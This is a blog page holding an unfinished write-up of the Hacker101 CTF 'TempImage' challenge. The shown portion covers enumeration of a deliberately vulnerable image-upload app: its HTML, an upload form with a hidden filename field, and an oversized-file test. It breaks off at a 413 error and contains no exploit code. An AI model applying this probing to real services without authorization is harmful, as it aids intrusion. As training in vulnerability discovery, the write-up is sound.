<!DOCTYPE html><html><head><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="preconnect" href="https://fonts.gstatic.com" class="jsx-37717e9a7cbc0337"/><link href="https://fonts.gstatic.com/s/firacode/v10/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff" rel="preload" crossorigin="crossorigin" type="font/woff2" as="font" class="jsx-37717e9a7cbc0337"/><link rel="stylesheet" class="jsx-37717e9a7cbc0337" data-href="https://fonts.googleapis.com/css2?family=Fira+Code&amp;display=swap" data-optimized-fonts="true"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TZ2VB384DV" class="jsx-37717e9a7cbc0337"></script><script class="jsx-37717e9a7cbc0337">
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());

            gtag('config', 'G-TZ2VB384DV');
            </script><title>Hacker101 CTF TempImage [moderate] Write-Upa work in progress</title><meta name="copyright" content="lwlx. 2021"/><link rel="canonical" href="https://dev.lwlx.xyz/blog/hacker101-ctf-tempimage"/><meta name="description" content="A write up for the TempImage [moderate] challenge"/><meta property="og:type" content="website"/><meta name="og:title" property="og:title" content="Hacker101 CTF TempImage [moderate] Write-Upa work in progress"/><meta name="og:description" property="og:description" content="A write up for the TempImage [moderate] challenge"/><meta property="og:site_name" content="dev.lwlx.xyz"/><meta property="og:url" content="https://dev.lwlx.xyz/blog/hacker101-ctf-tempimage"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Hacker101 CTF TempImage [moderate] Write-Upa work in progress"/><meta name="twitter:description" content="A write up for the TempImage [moderate] challenge"/><meta name="twitter:site" content="@0x0000005"/><meta name="twitter:creator" content="@0x0000005"/><meta name="twitter:image" content="https://dev.lwlx.xyz/hackerone/tempimage/tempimage-hackerone"/><meta property="og:image" content="https://dev.lwlx.xyz/hackerone/tempimage/tempimage-hackerone"/><meta name="next-head-count" content="24"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-ffff7cc2ca7bd393.js" defer=""></script><script src="/_next/static/chunks/framework-4975f770e34de116.js" defer=""></script><script src="/_next/static/chunks/main-22bd8129361cadd1.js" defer=""></script><script src="/_next/static/chunks/pages/_app-409dcfda377843b8.js" defer=""></script><script src="/_next/static/chunks/286-52bf752def536adc.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bblog%5D-f33cd47b729aa1bd.js" defer=""></script><script src="/_next/static/_GRPRnWxfZ3rO_PvTG53y/_buildManifest.js" defer=""></script><script src="/_next/static/_GRPRnWxfZ3rO_PvTG53y/_ssgManifest.js" defer=""></script><script src="/_next/static/_GRPRnWxfZ3rO_PvTG53y/_middlewareManifest.js" defer=""></script><style id="__jsx-62f0b32f662fb62a">.blog-post{width:100%;
max-width:1080px}</style><style id="__jsx-960443092">.lwlx-markdown p, .lwlx-markdown li{line-height:32px;
font-size:21px;
color:#ccc;
overflow-wrap:break-word}
.lwlx-markdown h1, .lwlx-markdown h2, .lwlx-markdown h3, .lwlx-markdown h4, .lwlx-markdown h5, .lwlx-markdown h6{margin:0px;
padding:0px}
.lwlx-markdown h1>a, .lwlx-markdown h2>a, .lwlx-markdown h3>a, .lwlx-markdown h4>a, .lwlx-markdown h5>a, .lwlx-markdown h6>a{text-decoration:underline;
color:#f07693}
.lwlx-markdown hr{margin:20px 0px;
opacity:0.35}
.lwlx-markdown h1{font-size:1.5em;
line-height:56px;
padding-top:30px;
padding-bottom:10px;
margin-top:30px;
margin-bottom:30px}
.lwlx-markdown h2{font-size:1.3em;
padding-top:25px;
padding-bottom:10px;
margin-top:25px;
margin-bottom:25px}
.lwlx-markdown h3{font-size:1.2em;
padding-top:20px;
padding-bottom:10px;
margin-top:20px;
margin-bottom:20px}
.lwlx-markdown h4{font-size:1em;
padding-top:15px;
padding-bottom:10px;
margin-top:15px;
margin-bottom:15px}
.lwlx-markdown h5{padding-top:10px;
padding-bottom:10px;
margin-top:10px;
margin-bottom:10px}
.lwlx-markdown h6{padding-top:5px;
padding-bottom:10px;
margin-top:5px;
margin-bottom:5px}
.lwlx-markdown p{padding:10px 0px;
margin:10px 0px}
.lwlx-markdown li{padding:10px 0px}
.lwlx-markdown img{width:100%;
border-radius:8px;
box-shadow:0px 4px 30px #00000040}
.lwlx-markdown code{font-family:'Fira Code', monospace;
background-color:#f07693f0;
color:#222;
padding:2px 2px;
border-radius:2px;
font-size:13px}
.lwlx-markdown pre{margin:12px 0px!important}
.lwlx-markdown ol pre, .lwlx-markdown ol p{margin:0px 0px!important}
.lwlx-markdown blockquote{margin:0px;
padding-left:1em;
border-left:4px solid #F07693}
.lwlx-markdown table{padding:4px;
background:rgba(0, 0, 0, 0.02)}
.lwlx-markdown table code{background-color:#f07693f0;
color:#222;
padding:2px 2px;
border-radius:4px;
font-size:1em;
line-height:1.8em}
.lwlx-markdown tbody td{padding:12px;
border-top:solid 1px #00000020}
.lwlx-markdown thead td{padding:8px;
background:#f07693;
font-size:16px}
a{text-decoration:underline;
color:#f07693}
@media only screen and (min-width:768px) {.lwlx-markdown code{background-color:#f07693f0;
color:#222;
padding:3px 3px;
border-radius:2px;
font-size:16px}
.lwlx-markdown h1{font-size:46px;
line-height:56px;
padding-top:30px;
padding-bottom:10px;
margin-top:30px;
margin-bottom:30px}
.lwlx-markdown h2{padding-top:25px;
padding-bottom:10px;
margin-top:25px;
margin-bottom:25px}
.lwlx-markdown h3{padding-top:20px;
padding-bottom:10px;
margin-top:20px;
margin-bottom:20px}
.lwlx-markdown h4{padding-top:15px;
padding-bottom:10px;
margin-top:15px;
margin-bottom:15px}
.lwlx-markdown h5{padding-top:10px;
padding-bottom:10px;
margin-top:10px;
margin-bottom:10px}
.lwlx-markdown h6{padding-top:5px;
padding-bottom:10px;
margin-top:5px;
margin-bottom:5px}
.lwlx-markdown p{padding:10px 0px;
margin:10px 0px}}</style><style id="__jsx-37717e9a7cbc0337">html, body, #__next{min-height:100%;
font-family:Fira Code, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif}
*{box-sizing:border-box}</style><style data-href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap">@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sFVQ.woff) format('woff')}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV37MOzlojwUKaJO.woff) format('woff');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVT7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVz7MOzlojwUKaJO.woff) format('woff');unicode-range:U+1F00-1FFF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVP7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0370-03FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV77MOzlojwUKaJO.woff) format('woff');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff) format('woff');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 1bd2rq4">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:#fff;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#121212;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#121212;}</style><style data-emotion="css 1ourwbl">.css-1ourwbl{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;min-height:100vh;}</style><div class="MuiBox-root css-1ourwbl"><div style="top:0;width:90%;border-radius:12px;margin-top:14px;margin-bottom:12px;height:48px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;padding:24px;font-size:12pt;font-family:Fira Code;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 11px  rgba(58,58,58, 0.5)"><a href="/" style="text-decoration:none"><p style="color:#F07693">dev.lwlx.xyz</p></a><div style="flex:1"></div><a href="https://github.com/Lawlez/myOSWE" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true" style="margin-right:-12px"><path fill="#F07693" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg><p style="padding:0px 1em;color:#F07693">GitHub</p></a><a href="https://twitter.com/0x0000005" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 24 24" style="margin-right:-12px"><g><path fill="#F07693" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg><p style="padding:0px 1em;color:#F07693">Twitter</p></a></div><style data-emotion="css 5csqms">.css-5csqms{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;}@media (min-width:1200px){.css-5csqms{max-width:1200px;}}</style><div class="MuiContainer-root MuiContainer-maxWidthLg MuiContainer-disableGutters css-5csqms"><div style="display:flex;flex-direction:row;justify-content:center;width:100%;padding:0px 0px 100px 0px" class="jsx-62f0b32f662fb62a"><div class="jsx-62f0b32f662fb62a blog-post"><picture><source srcSet="/hackerone/tempimage/tempimage-hackerone.webp" type="image/webp" style="width:100%;max-width:100%;margin:0px;max-height:490px"/><img src="/hackerone/tempimage/tempimage-hackerone.jpg" style="width:100%;max-width:100%;margin:0px;max-height:490px"/></picture><div style="padding:32px 2vw 8px 2vw" class="jsx-62f0b32f662fb62a"><h1 style="margin:8px 0px 8px 0px;padding:0;border:none;font-size:2.6em;font-family:Fira Code" class="jsx-62f0b32f662fb62a">Hacker101 CTF TempImage [moderate] Write-Up</h1><h2 style="margin:8px 0px;padding:0;border:none;font-weight:400;opacity:0.6;font-family:Fira Code" class="jsx-62f0b32f662fb62a">a work in progress</h2><hr style="height:2px;background:#1177AB;margin:24px 0px;border:none;border-radius:1px" class="jsx-62f0b32f662fb62a"/><div style="font-family:Fira Code;margin:0px;padding:0px"><div style="display:flex;flex-direction:row;align-items:center;justify-content:flex-start"><picture><source srcSet="/profile.webp" type="image/webp" style="background:#141414;box-shadow:6px 6px 8px rgb(4,4,4,0.6), -6px -6px 8px  rgba(58,58,58, 0.5);width:64px;height:64px;border-radius:34px;margin:0px 8px 0px 0px"/><img src="/profile.jpg" style="background:#141414;box-shadow:6px 6px 8px rgb(4,4,4,0.6), -6px -6px 8px  rgba(58,58,58, 0.5);width:64px;height:64px;border-radius:34px;margin:0px 8px 0px 0px"/></picture><div><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt">lwlx</p><p style="opacity:0.6;margin:2px;padding:0;line-height:1.2;font-size:11pt">23. January 2021</p><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt"><a style="text-decoration:none;color:#1177AB" href="https://twitter.com/0x0000005">@0x0000005</a></p></div></div></div></div><div style="width:100%;padding:0px 2vw" class="jsx-62f0b32f662fb62a"><div style="width:100%" class="jsx-960443092 lwlx-markdown"><h3><code>WIP</code></h3><p>This is my Write Up for the &quot;TempImage&quot; challenge of HackerOne&#x27;s CTF.</p><p>As usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">&lt;</span><span class="token token" style="color:#c9c0be;background:#000000">!</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> https</span><span class="token token" style="color:#c9c0be;background:#000000">:</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ctf</span><span class="token token" style="color:#999999">.</span><span class="token token property-access">hacker101</span><span class="token token" style="color:#999999">.</span><span class="token token property-access">com</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ctf</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>launch</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">12</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">&gt;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">html</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span class="token token plain-text">  </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">head</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">title</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">TempImage &amp;mdash; Trial</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">title</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span class="token token plain-text">  </span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">head</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span class="token token plain-text">  </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">body</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">TempImage</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">9</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">p</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">10</span><span class="token token plain-text">      </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">b</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">UNREGISTERED</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">b</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">11</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">p</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">12</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">p</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">13</span><span class="token token plain-text">      </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">a</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">href</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">upload.php</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">Upload image</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">a</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">14</span><span class="token token plain-text">    </span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">p</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">15</span><span class="token token plain-text">  </span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">body</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">16</span><span class="token token plain-text"></span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">html</span><span class="token token" style="color:#999999">&gt;</span></span></code></pre><p>It signifies that its an UNEGISTERED version of the app, thus working in trial mode.</p><h2>Enumeration</h2><p>So lets start to explore the app and what it can do. We start by clicking the &quot;Upload image&quot; Button.
This leads us to a new page <strong>/upload.php</strong>, here we can select a file from our computer, and have a submit button to send the form.</p><p>The form will be sent to a <strong>doUpload.php</strong> file. Upon closer inspection we alos see that there is a hidden field &quot;filename&quot;, which gets filled in by a JS snippet.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>   </span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">Upload</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>		</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">form</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">action</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">doUpload.php</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">method</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">POST</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">enctype</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">multipart/form-data</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span class="token token plain-text">			</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">input</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">type</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">file</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">name</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">file</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">id</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">file</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span class="token token plain-text">			</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">input</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">type</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">hidden</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">name</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">filename</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">id</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">filename</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span class="token token plain-text">			</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">input</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">type</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">submit</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#4499ee"> </span><span class="token token" style="color:#f07693">value</span><span class="token token attr-equals" style="color:#999999">=</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#1177ab">Upload</span><span class="token token" style="color:#999999">&quot;</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span class="token token plain-text">		</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">form</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span class="token token plain-text">		</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">script</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span>			$(document).ready(function() {
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">9</span>				$(&#x27;#file&#x27;).change(function(e) {
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">10</span>					$(&#x27;#filename&#x27;).val(e.target.files[0].name)
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">11</span>				})
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">12</span>			})
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">13</span><span class="token token plain-text">	 </span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">script</span><span class="token token" style="color:#999999">&gt;</span></span></code></pre><p>So it seems this lil script extracts the <code>file.name</code> prop from the fileOpbject the user uploads to the input type=&quot;file&quot;.</p><p>Lets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">center</span><span class="token token" style="color:#999999">&gt;</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">413 Request Entity Too 